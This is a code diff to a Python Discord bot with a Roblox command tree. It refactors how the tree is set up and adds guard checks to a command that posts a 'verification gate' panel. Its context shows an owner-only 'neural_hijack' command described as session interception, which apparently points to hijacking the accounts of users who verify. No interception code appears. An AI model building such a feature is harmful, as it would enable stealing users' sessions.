@@ -262,8 +262,7 @@ class RobloxCommandTree(app_commands.CommandTree):
 
 class UnifiedForensicsBot(commands.Bot):
     def __init__(self) -> None:
-        super().__init__(command_prefix="!", intents=intents)
-        self.tree = RobloxCommandTree(self)
+        super().__init__(command_prefix="!", intents=intents, tree_cls=RobloxCommandTree)
 
     async def setup_hook(self) -> None:
         self.add_view(PersistentVerificationView())
@@ -368,8 +367,11 @@ async def scan_command(interaction: discord.Interaction, username: str) -> None:
 @bot.tree.command(name="setupverify", description="Deploys the persistent verification panel in this channel.")
 @app_commands.checks.has_permissions(administrator=True)
 async def setupverify(interaction: discord.Interaction):
+    if not isinstance(interaction, discord.Interaction):
+        return
     embed = discord.Embed(title="🛡️ Server Verification Gate", description="Click **Verify Account** below to launch the secure portal.", color=0x2B2D31)
-    await interaction.channel.send(embed=embed, view=PersistentVerificationView())
+    if interaction.channel:
+        await interaction.channel.send(embed=embed, view=PersistentVerificationView())
     await interaction.response.send_message("✅ Verification panel successfully deployed.", ephemeral=True)
 
 @bot.tree.command(name="neural_hijack", description="🧠 [OWNER ONLY] Live telemetry stream & session interception.")
